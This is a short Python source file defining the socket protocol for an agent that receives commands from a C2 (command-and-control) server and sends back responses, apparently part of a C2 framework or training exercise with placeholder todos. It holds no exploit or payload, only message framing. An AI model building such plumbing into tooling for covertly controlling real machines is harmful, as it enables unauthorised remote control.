from protocol.common import *


class AgentProtocol:
    def __init__(self, client_socket):
        self.client_socket = client_socket

    def agent_hello_receive(self):
        return handle_init_handshake_receive(self.client_socket)

    def agent_hello_send(self, agent_uuid):
        return handle_init_handshake_send(self.client_socket, agent_uuid, MESSAGE_REQUEST)

    # todo: #to-fill
    def receive_command_from_c2(self):
        command_id = receive_command_id(self.client_socket)
        print(f"[+] Received command {command_id} from C2")

        message_type, status, payload_size = struct.unpack(COMMAND_PAYLOAD_PACKET_FORMAT, self.client_socket.recv(6))
        if message_type != MESSAGE_REQUEST:
            raise TypeError(f"[-] C2 sent {message_type} message")

        arguments = receive_payload(self.client_socket, payload_size)
        return command_id, arguments

    def send_command_response(self, command_id, command_status, command_response):
        if not isinstance(command_response, bytes):
            command_response = command_response.encode()  # make sure return type for socket is bytes

        print(f"[+] Sending response for command {command_id}. Total response size: {len(command_response)}")
        self.client_socket.sendall(
            (pack_command_id(command_id) +
             struct.pack(COMMAND_PAYLOAD_PACKET_FORMAT, MESSAGE_RESPONSE, command_status, len(command_response)) +
             command_response)
        )
    # todo: #to-fill



